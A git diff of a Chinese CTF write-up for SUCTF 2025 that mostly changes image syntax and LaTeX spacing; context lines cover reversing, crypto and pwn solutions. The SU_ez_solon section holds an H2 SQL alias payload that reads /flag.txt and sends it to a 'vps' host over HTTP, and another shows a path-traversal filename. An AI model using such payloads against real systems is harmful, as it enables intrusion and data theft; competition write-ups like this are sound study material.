@@ -7,7 +7,7 @@ toc: true
 ---
 我想我大概，一辈子也忘不了 S1uM4i 吧。
 
-![img](../images/2025-SUCTF/GhIuattW8AA8tQP.webp)
+![](../images/2025-SUCTF/GhIuattW8AA8tQP.webp)
 
 <!--more-->
 
@@ -78,17 +78,17 @@ int __fastcall main(int argc, const char **argv, const char **envp)
 
 原来的长度判定nop掉增加可用的用户代码段 再在此处插入判断是否回到原点 如果是直接输出`wrong`退出:
 
-![img](../images/2025-SUCTF/06dfd0ea-a544-463c-abd8-721676763873.webp)
+![](../images/2025-SUCTF/06dfd0ea-a544-463c-abd8-721676763873.webp)
 
 原先判定边界的地方改成判定是否回到原点:
 
-![img](../images/2025-SUCTF/d098d23c-6699-4ea4-8be7-a0214b9580ec.webp)
+![](../images/2025-SUCTF/d098d23c-6699-4ea4-8be7-a0214b9580ec.webp)
 
 因为要爆破所以长度肯定不够到达`target` 但是成功执行到判定`pos`是否到达`target`说明这条路是可以走的 输出`rong`
 
 patch之后的逻辑:
 
-![img](../images/2025-SUCTF/badf49ef-28bc-4712-b803-c5e057c03790.webp)
+![](../images/2025-SUCTF/badf49ef-28bc-4712-b803-c5e057c03790.webp)
 
 至此可以使用下面的脚本爆破出到达终点的路径:
 
@@ -145,7 +145,7 @@ while True:
 
 main函数输入19位input，先进function2，用rc4加密比较前16位，然后通过funtion0栈溢出跳到function1，地址为0x40223d，得到长为9的第二个input，合并起来就是最终输入
 
-![img](../images/2025-SUCTF/ca0fa7a4-6bf5-4ac3-a518-4b954f14dbcf.webp)
+![](../images/2025-SUCTF/ca0fa7a4-6bf5-4ac3-a518-4b954f14dbcf.webp)
 
 ```LaTeX
 SUCTF{We1com3ToReWorld="@AndPWNT00}
@@ -357,11 +357,11 @@ print("SUCTF{" + rc4decrypt(R2, terms) + "}")
 
 apk实现了一个动态链接器，把assets目录下的main二进制文件加载到内存然后执行。main最开始的x86部分是没用的，纯粹是幌子，在代码中将main加载后在0x91f0的file offset中加载真正执行的文件。
 
-![img](../images/2025-SUCTF/5268f14f-bfe7-414f-b605-04cffc0181f2.webp)
+![](../images/2025-SUCTF/5268f14f-bfe7-414f-b605-04cffc0181f2.webp)
 
 不过main中该偏移对应的header是错的，program header也是不对的。header和program header都在下方的函数中动态解密出来，直接动态取出然后patch回去即可
 
-![img](../images/2025-SUCTF/624cb89f-9911-485d-baea-c58fe5d00dbc.webp)
+![](../images/2025-SUCTF/624cb89f-9911-485d-baea-c58fe5d00dbc.webp)
 
 得到恢复header的main二进制文件后对算法进行分析
 
@@ -435,7 +435,7 @@ int main()
 
 看check函数，输入长度32，用sbox生成虚拟机的idx，参数，然后用idx去找执行的函数，然后传入参数。用的是libffi库，最后执行的是ffi_call函数，简单理解成虚拟机入口就行了。不同的v4对应的是不同的参数数目。注意一下就行了
 
-![img](../images/2025-SUCTF/e8aa19b4-f6a1-4cb8-913a-430987de76c0.webp)
+![](../images/2025-SUCTF/e8aa19b4-f6a1-4cb8-913a-430987de76c0.webp)
 
 dump出反编译后的伪c代码，批量改写成python的函数形式，然后z3解一下即可
 
@@ -970,9 +970,9 @@ sub_C160(const char *a1, char *a2){
 
 sub_57B0的check整理一下就是：
 
-![img](../images/2025-SUCTF/b5968a0a-2364-454f-8c68-45ffe8aa9205.webp)
+![](../images/2025-SUCTF/b5968a0a-2364-454f-8c68-45ffe8aa9205.webp)
 
-最后解8个方程，方程为$$\left \lfloor \frac{x^2+2*x-3}{2} \right \rfloor == arr[m]$$
+最后解8个方程，方程为 $$ \left \lfloor \frac{x^2+2*x-3}{2} \right \rfloor == arr[m] $$
 
 用z3解：
 
@@ -1008,7 +1008,7 @@ Term:
 ...
 ```
 
-![img](../images/2025-SUCTF/99f2d99a-36a3-48e4-b322-066dce10cd30.webp)
+![](../images/2025-SUCTF/99f2d99a-36a3-48e4-b322-066dce10cd30.webp)
 
 term的地址是0x5559C82C5040，
 
@@ -1315,7 +1315,7 @@ print(trans)
 print('SUCTF{%s}' % md5(trans.encode()).hexdigest())
 ```
 
-![img](../images/2025-SUCTF/dc4fed4e-c07a-4bb9-b241-6abf0d449284.webp)
+![](../images/2025-SUCTF/dc4fed4e-c07a-4bb9-b241-6abf0d449284.webp)
 
 # 2. Web
 
@@ -1474,7 +1474,7 @@ echo base64_encode(serialize($destrct));
 
 ## 2.4 SU_ez_solon
 
-![img](../images/2025-SUCTF/f39b667b-5d99-4b0b-afaa-aba7de47a4f3.webp)
+![](../images/2025-SUCTF/f39b667b-5d99-4b0b-afaa-aba7de47a4f3.webp)
 
 ```SQL
 CREATE ALIAS EXECf AS 'String shellexec(String cmd) throws java.io.IOException {String str = "";java.io.File file = new java.io.File("/flag.txt");try (java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.FileReader(file))) {String line;while ((line = reader.readLine()) != null) {    str += line;}} catch (java.io.IOException e) {e.printStackTrace();} java.net.URL url = new java.net.URL("http://vps:1234/test?str="+str);java.net.HttpURLConnection connection = (java.net.HttpURLConnection) url.openConnection();connection.setRequestMethod("GET");connection.setRequestProperty("User-Agent", "Java HTTP Client");int responseCode = connection.getResponseCode(); return "";}';
@@ -1634,7 +1634,7 @@ get object versionid: CAEQmwIYgYDA6Lad1qIZIiAyMjBhNWVmMDRjYzY0MDI3YjhiODU3ZDQ2MD
 
 ## 3.1 SU_checkin
 
-![img](../images/2025-SUCTF/2779fdf3-9699-4ccb-a925-4503b55d4a80.webp)
+![](../images/2025-SUCTF/2779fdf3-9699-4ccb-a925-4503b55d4a80.webp)
 
 ```Plain
 filename="../../../../../../../../../proc/self/cmdline"
@@ -1741,7 +1741,7 @@ for a, b, c in tqdm(s):
         exit()
 ```
 
-![img](../images/2025-SUCTF/a574180c-2789-40d5-a275-7fa29afc55d7.webp)
+![](../images/2025-SUCTF/a574180c-2789-40d5-a275-7fa29afc55d7.webp)
 
 值得一提的是，按照 RFC2898 Section 5.1（ https://datatracker.ietf.org/doc/html/rfc2898#section-5.1 ）的定义，PBE 的密钥派生时，salt 和 MD5 的迭代轮数是作为算法输入出现的，而不是硬编码在算法中的。尽管容易搜索到 salt 为密文前 8 字节、迭代轮数为 1000 的一种实现，但题目中应当明确给出这一点，特别是作为一个需要爆破的题目，而不应让做题人擅自假设——否则就和那些 “需要搜到和出题人用的同一个脚本” 的题目没什么区别了。
 
@@ -1761,7 +1761,7 @@ Wayback Machine 有存档
 
 https://web.archive.org/web/20241225122922/https://www.cnblogs.com/cuisha12138/p/18631364
 
-![img](../images/2025-SUCTF/bd33395c-33fa-4107-97c2-f129dc20d79b.webp)
+![](../images/2025-SUCTF/bd33395c-33fa-4107-97c2-f129dc20d79b.webp)
 
 在 GitHub 上删除分支不会清除提交，可以找到
 
@@ -1771,11 +1771,11 @@ https://github.com/testtttsu/homework/blob/a4be9c81ae540340f3e208dc9b1ee109ea503
 
 用盲水印检测工具或 stegsolve 可以看到密码（涂黑了但没完全涂黑）
 
-![img](../images/2025-SUCTF/d238dcbe-b9c9-4e3b-ae9a-96d25a89660a.webp)
+![](../images/2025-SUCTF/d238dcbe-b9c9-4e3b-ae9a-96d25a89660a.webp)
 
 解压 lost_flag.txt 得到
 
-![img](../images/2025-SUCTF/775649e6-0a4f-45c0-9394-72a27c0c8296.webp)
+![](../images/2025-SUCTF/775649e6-0a4f-45c0-9394-72a27c0c8296.webp)
 
 用 opencv 相似度识别，发现有 27 种符号，先按出现顺序依次替换为 `a-z 以便进一步分析
 
@@ -1839,7 +1839,7 @@ result = result.replace('`', the_space)
 print(result)
 ```
 
-![img](../images/2025-SUCTF/95afcced-3062-41ce-b2a0-9f915f7abea2.webp)
+![](../images/2025-SUCTF/95afcced-3062-41ce-b2a0-9f915f7abea2.webp)
 
 ```Plain
 a bcdef ghijkl mnop qhrdst uavw xdy
@@ -1984,11 +1984,11 @@ pub mod checkin {
 
 在Anchor.toml内可以得到信息如下：
 
-![img](../images/2025-SUCTF/02606bfe-e79b-4606-a521-d2bd796c5485.webp)
+![](../images/2025-SUCTF/02606bfe-e79b-4606-a521-d2bd796c5485.webp)
 
 这里的cluster = devnet说明使用的是devnet，利用Solscan的区块链浏览器可以进行查看。在Solscan上搜索SUCTF2Q25DnchainCheckin11111111111111111111并且限定为devnet可以得到：
 
-![img](../images/2025-SUCTF/71e81e5d-a5c0-4f03-b8a2-47f6af17e3a9.webp)
+![](../images/2025-SUCTF/71e81e5d-a5c0-4f03-b8a2-47f6af17e3a9.webp)
 
 此时再看源码，在checkin.rs内
 
@@ -2011,11 +2011,11 @@ impl<'info> Checkin<'info> {
 
 将上面的地址放入cyberchef后能够自动用base58 decode解出flag3：
 
-![img](../images/2025-SUCTF/a28914fa-dbbb-4631-9e77-022f505fedf8.webp)
+![](../images/2025-SUCTF/a28914fa-dbbb-4631-9e77-022f505fedf8.webp)
 
 同时，在checkin.rs内还有一个`msg!("flag1");`，这个提示我们flag1在返回的消息当中，此时查看返回的消息(日志)即可得到flag1：
 
-![img](../images/2025-SUCTF/13fd1115-ac11-4a81-a0b6-e6f6e9b757ff.webp)
+![](../images/2025-SUCTF/13fd1115-ac11-4a81-a0b6-e6f6e9b757ff.webp)
 
 下面一段经过base58解码后即可得到flag1：
 
@@ -2133,7 +2133,7 @@ print(f"{wtf = }")
 
 赢：
 
-![img](../images/2025-SUCTF/0460b9ca-f580-4fdf-a8f8-c78182f3c020.webp)
+![](../images/2025-SUCTF/0460b9ca-f580-4fdf-a8f8-c78182f3c020.webp)
 
 ## 3.7 SU_AI_how_to_encrypt_plus
 
@@ -2242,9 +2242,9 @@ flag二进制经过zfill填充，cs[0]对应的应该是i=0，找到cs[0]和cs[i
 
 根据BLS12-381的运算规则
 
-假设$$k_1=o//n_1,k_2=o//n_2$$
+假设 $$ k_1=o//n_1,k_2=o//n_2 $$ 
 
-$$i=0\longrightarrow T_0=aG_1+bP_2\\ i=1\longrightarrow T_1=cG_2+dP_1\\ i=0\longrightarrow T_2=eG_1+fP_2\\ E(T_0,T_1)=E(G_1,G_2)^{ac-bdk_1k_2}\\ E(T_0,T_2)=E(G_1,G_2)^{(af-be)k_2}\\ E(T_0,T_1)^{n_2}\neq1\\ E(T_0,T_2)^{n_2}=E(T_0,T_2)^{(af-be)o}=1$$
+$$ i=0\longrightarrow T_0=aG_1+bP_2\\ i=1\longrightarrow T_1=cG_2+dP_1\\ i=0\longrightarrow T_2=eG_1+fP_2\\ E(T_0,T_1)=E(G_1,G_2)^{ac-bdk_1k_2}\\ E(T_0,T_2)=E(G_1,G_2)^{(af-be)k_2}\\ E(T_0,T_1)^{n_2}\neq1\\ E(T_0,T_2)^{n_2}=E(T_0,T_2)^{(af-be)o}=1 $$
 
 因为阶为o，判断weil_pairing后的n2次方结果是否为1即可
 
@@ -2525,7 +2525,7 @@ print(CC(fz))
 
 ## 4.6 SU_rsa
 
-$$e(d_m + d_l) = 1 + k\phi$$
+$$ e(d_m + d_l) = 1 + k\phi $$ 
 
 已知e,d_m,N分解N
 
@@ -2537,7 +2537,7 @@ https://github.com/fffmath/MSBsOfPrivateKeyAttack
 
 给的数据里有个很接近题目的，e差了一位
 
-![img](../images/2025-SUCTF/975718a7-75dc-449b-8ac8-fcbb7f0f1c78.webp)
+![](../images/2025-SUCTF/975718a7-75dc-449b-8ac8-fcbb7f0f1c78.webp)
 
 但是论文中给出的代码跑超级慢，然后就手写了一个，核心是先恢复 k， 再恢复 p mod e，然后枚举+small_root 完事
 
@@ -2781,7 +2781,7 @@ sh.interactive()
 
 在add_file里，对src的缓存区大小过小，导致可以通过strncpy导致栈溢出
 
-![img](../images/2025-SUCTF/bc1f3069-c1ac-4d8a-a317-bdd06be22d5d.webp)
+![](../images/2025-SUCTF/bc1f3069-c1ac-4d8a-a317-bdd06be22d5d.webp)
 
 通过strlen来增加对src的偏移，因为栈上有残留指针，导致我们最大可以增加0xf的大小(本身它输入是9个字节)，然后通过这个就可以构造一下，绕过canary修改返回地址
 
@@ -3450,7 +3450,7 @@ sh.interactive()
 
 漏洞在于，创造ocean时，先往size写入数据，然后再进行判断；如果我们先创造一个合法大小的ocean，再创建一个非法ocean时，就可以修改size
 
-![img](../images/2025-SUCTF/dc3bd237-e919-4f71-ac95-b06f38603425.webp)
+![](../images/2025-SUCTF/dc3bd237-e919-4f71-ac95-b06f38603425.webp)
 
 思路，我们可以通过这个来实现修改text或者byte打开的文件堆块的fd值，因为text是需要得到在"0"-"255"的字符串值进行转化成byte，所以我们这里就必须通过byte直接读取/dev/urandom的随机值对text的fd进行修改，修改成标准输入0，之后我们就可以通过text进行在ocean里任意往下写字符
 
